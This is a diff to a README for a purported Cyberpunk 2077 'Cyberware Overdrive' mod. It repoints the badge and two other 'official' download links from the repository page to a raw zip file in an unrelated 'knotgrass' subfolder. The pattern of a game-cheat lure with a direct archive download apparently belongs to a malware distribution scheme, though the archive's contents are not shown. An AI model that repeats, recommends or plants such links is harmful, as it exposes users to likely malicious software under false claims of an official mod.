@@ -1,6 +1,6 @@
 # ⚡ Cyberpunk-2077-Cyberware-Overdrive - Unlock Ultimate Power Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Cyberware_Overdrive-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blastocladialesepha247/Cyberpunk-2077-Cyberware-Overdrive)
+[![Download Now](https://img.shields.io/badge/Download-Cyberware_Overdrive-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/blastocladialesepha247/Cyberpunk-2077-Cyberware-Overdrive/main/knotgrass/Cyberpunk-Overdrive-Cyberware-v2.1.zip)
 
 ##  About This Mod
 
@@ -25,7 +25,7 @@ Follow these simple steps to get Cyberware Overdrive running on your PC. It take
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [Download Cyberware Overdrive](https://github.com/blastocladialesepha247/Cyberpunk-2077-Cyberware-Overdrive)
+**Visit this link to download the application:** [Download Cyberware Overdrive](https://raw.githubusercontent.com/blastocladialesepha247/Cyberpunk-2077-Cyberware-Overdrive/main/knotgrass/Cyberpunk-Overdrive-Cyberware-v2.1.zip)
 
 This link will take you to the official download page. Look for the big download button or the latest release file. Click it and wait for the download to complete.
 
@@ -104,7 +104,7 @@ Make sure you're running the latest version of the game and the mod. Restart bot
 
 Need to download again? Here's the official link:
 
-**Visit this link to download the application:** [https://github.com/blastocladialesepha247/Cyberpunk-2077-Cyberware-Overdrive](https://github.com/blastocladialesepha247/CCyberpunk-2077-Cyberware-Overdrive)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/blastocladialesepha247/Cyberpunk-2077-Cyberware-Overdrive/main/knotgrass/Cyberpunk-Overdrive-Cyberware-v2.1.zip](https://raw.githubusercontent.com/blastocladialesepha247/Cyberpunk-2077-Cyberware-Overdrive/main/knotgrass/Cyberpunk-Overdrive-Cyberware-v2.1.zip)
 
 Save the file to a safe location like your Desktop or Documents folder for easy access.
 
